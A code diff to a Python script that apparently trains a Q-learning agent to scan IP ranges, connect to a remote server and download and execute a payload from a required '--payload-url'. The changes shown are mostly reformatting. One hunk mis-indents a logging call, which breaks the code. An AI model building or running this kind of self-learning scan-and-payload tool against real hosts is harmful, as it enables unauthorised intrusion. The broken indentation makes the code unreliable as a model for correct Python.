@@ -359,7 +359,10 @@ def curriculum_learning_setup(ip_range: List[str]) -> List[str]:
         logger.critical("No valid IP addresses provided")
         sys.exit(1)
 
-    return sorted(validated_ips, key=lambda ip: int(ip.split('.')[-1]) if '.' in ip and ip.split('.')[-1].isdigit() else float('inf'))
+    return sorted(
+        validated_ips,
+        key=lambda ip: int(ip.split('.')[-1]) if '.' in ip and ip.split('.')[-1].isdigit() else float('inf')
+    )
 
 def choose_action(q_table, state, exploration_probability):
     best_ltm_action = long_term_memory.best_action(state)
@@ -494,7 +497,10 @@ def main(ip_range, remote_server, port, payload_url, load_model: bool = False, s
         q_table = train_episode(q_table, validated_ips, episode, exploration_probability)
 
         exploration_probability *= EXPLORATION_DECAY
-        logger.info(f"Episode {episode+1}/{MAX_EPISODES} completed. Exploration probability: {exploration_probability:.4f}")
+            logger.info(
+                f"Episode {episode+1}/{MAX_EPISODES} completed. "
+                f"Exploration probability: {exploration_probability:.4f}"
+            )
 
         if save_model and (episode + 1) % 100 == 0:
             save_q_table(q_table, f"q_table_episode_{episode+1}.json")
@@ -507,7 +513,10 @@ if __name__ == "__main__":
     parser.add_argument("ip_range", nargs="+", type=str, help="A list of IP addresses to scan.")
     parser.add_argument("--remote-server", type=str, default="example.com", help="The remote server to connect to.")
     parser.add_argument("--port", type=int, default=8080, help="The port to connect to on the remote server.")
-    parser.add_argument("--payload-url", type=str, required=True, help="The URL of the payload to download and execute.")
+    parser.add_argument(
+        "--payload-url", type=str, required=True,
+        help="The URL of the payload to download and execute."
+    )
     parser.add_argument("--load-model", action="store_true", help="Load Q-table from previous training.")
     parser.add_argument("--no-save", action="store_true", help="Do not save Q-table after training.")
     args = parser.parse_args()
